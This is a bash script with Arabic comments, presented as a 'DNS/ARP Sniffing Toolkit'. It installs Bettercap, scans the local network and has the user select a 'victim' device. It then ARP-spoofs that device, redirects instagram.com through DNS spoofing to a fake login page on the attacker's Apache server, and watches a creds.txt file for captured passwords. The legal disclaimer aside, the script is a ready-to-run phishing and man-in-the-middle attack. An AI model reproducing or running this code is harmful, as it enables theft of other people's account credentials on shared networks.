#!/bin/bash

# === شعار الأدوات ===
clear
echo ""
echo -e "\e[1;32m██████  ███████  ██████  ███████  ███████ \e[0m"
echo -e "\e[1;33m██      ██      ██       ██       ██      \e[0m"
echo -e "\e[1;34m██  ███ █████   ██   ██  █████    █████   \e[0m"
echo -e "\e[1;36m██   ██ ██      ██   ██  ██       ██      \e[0m"
echo -e "\e[1;35m ██████ ███████  ██████  ██       ███████ \e[0m"
echo ""
echo -e "\e[1;31m        [🔥 Welcome to SPOOF 🔥]\e[0m"
echo -e "\e[1;33m     - DNS/ARP Sniffing Toolkit -\e[0m"
echo ""

sleep 2

# === التحذير بخصوص القانون ===
echo -e "\e[1;31m[!] ⚠️ تحذير: هذه الأداة قد تكون غير قانونية في بعض الدول أو الأماكن.\e[0m"
echo -e "\e[1;33m[!] ⚠️ تأكد من أنك تستخدم الأداة في بيئة قانونية فقط.\e[0m"
echo -e "\e[1;32m[!] ⚠️ أي استخدام غير قانوني لهذه الأداة قد يعرضك للمسائلة القانونية.\e[0m"

# === التحقق من وجود الصفحة المزيفة ===
if [ ! -f /var/www/html/index.html ]; then
  echo -e "\e[1;31m[!] ⚠️ لم يتم العثور على صفحة index.html في /var/www/html\e[0m"
  echo -e "\e[1;33m[!] ⚠️ الرجاء وضع ملفات الصفحة المزيفة أولاً!\e[0m"
  exit 1
fi

# === عرض رسائل النجاح ===
echo -e "\e[1;32m[+] ✅ تم العثور على صفحة index.html!\e[0m"

# === التحقق من وجود Bettercap ===
if ! command -v bettercap &> /dev/null; then
  echo -e "\e[1;31m[!] ⚙️ Bettercap غير مثبت، جاري تثبيته ...\e[0m"
  sudo apt update
  sudo apt install -y build-essential libpcap-dev unzip wget

  wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_linux_amd64_2.32.0.zip -O bettercap.zip
  unzip bettercap.zip
  chmod +x bettercap
  sudo mv bettercap /usr/local/bin/
  rm bettercap.zip
  echo -e "\e[1;32m[+] ✅ تم تثبيت Bettercap.\e[0m"
else
  echo -e "\e[1;32m[+] ✅ Bettercap مثبت بالفعل.\e[0m"
fi

# === التحقق من وجود arp-scan ===
if ! command -v arp-scan &> /dev/null; then
  echo -e "\e[1;31m[!] ⚙️ الأداة arp-scan غير مثبتة. تثبيت ...\e[0m"
  sudo apt install -y arp-scan
fi

# === تشغيل Apache ===
echo -e "\e[1;32m[*] 🚀 تشغيل خادم Apache ...\e[0m"
sudo service apache2 restart

# === IP والواجهة ===
MY_IP=$(hostname -I | awk '{print $1}')
INTERFACE=$(ip -o -4 route show to default | awk '{print $5}')
echo -e "\e[1;32m[+] 📡 عنوان IP الخاص بك: $MY_IP\e[0m"
echo -e "\e[1;32m[+] 🌐 الواجهة المستخدمة: $INTERFACE\e[0m"

# === فحص الشبكة ===
echo -e "\e[1;33m[*] 🔍 البحث عن الأجهزة المتصلة ...\e[0m"
sudo arp-scan --interface=$INTERFACE --localnet > devices.txt

# === عرض الأجهزة ===
echo -e "\e[1;32m[*] 🖥️ الأجهزة المتصلة:\e[0m"
awk '/([0-9]{1,3}\.){3}[0-9]{1,3}/ {printf "[%d] %s - %s - %s\n", NR, $1, $2, $3}' devices.txt

read -p "[?] اختر رقم الجهاز الهدف: " CHOICE
VICTIM_IP=$(awk -v num=$CHOICE 'NR==num {print $1}' devices.txt)

if [ -z "$VICTIM_IP" ]; then
  echo -e "\e[1;31m[!] ❌ لم يتم تحديد IP صالح.\e[0m"
  exit 1
fi

echo -e "\e[1;32m[+] 🎯 تم اختيار الضحية: $VICTIM_IP\e[0m"

# === اختيار الموقع المزيف (Instagram فقط) ===
echo -e "\e[1;33m[?] اختر الموقع المزيف الذي تريد استخدامه:\e[0m"
echo -e "1) Instagram"

read -p "رقم الموقع: " SITE_CHOICE

case $SITE_CHOICE in
  1)
    DOMAIN="instagram.com,www.instagram.com"
    SITE_NAME="Instagram"
    ;;
  *)
    echo -e "\e[1;31m[!] ❌ اختيار غير صالح.\e[0m"
    exit 1
    ;;
esac

echo -e "\e[1;32m[+] 🎭 سيتم توجيه الضحية إلى صفحة $SITE_NAME المزيفة.\e[0m"

# === تجهيز سكربت Bettercap ===
cat <<EOF > bettercap_script.cap
set arp.spoof.targets $VICTIM_IP
set arp.spoof.internal true
arp.spoof on
set dns.spoof.all true
set dns.spoof.domains $DOMAIN
set dns.spoof.address $MY_IP
dns.spoof on
net.sniff on
EOF

# === مراقبة كلمات المرور ===
echo -e "\e[1;33m[*] 🔐 مراقبة ملف creds.txt ...\e[0m"
gnome-terminal -- bash -c "echo '[+] مراقبة كلمات المرور في الوقت الحقيقي'; tail -f /var/www/html/creds.txt; exec bash"

# === تشغيل Bettercap ===
echo -e "\e[1;32m[*] ⚡ تشغيل Bettercap ...\e[0m"
sudo bettercap -iface $INTERFACE -caplet bettercap_script.cap | tee bettercap_log.txt

# === الانتهاء ===
echo -e "\e[1;32m[+] تم تنفيذ الأداة بنجاح!\e[0m"
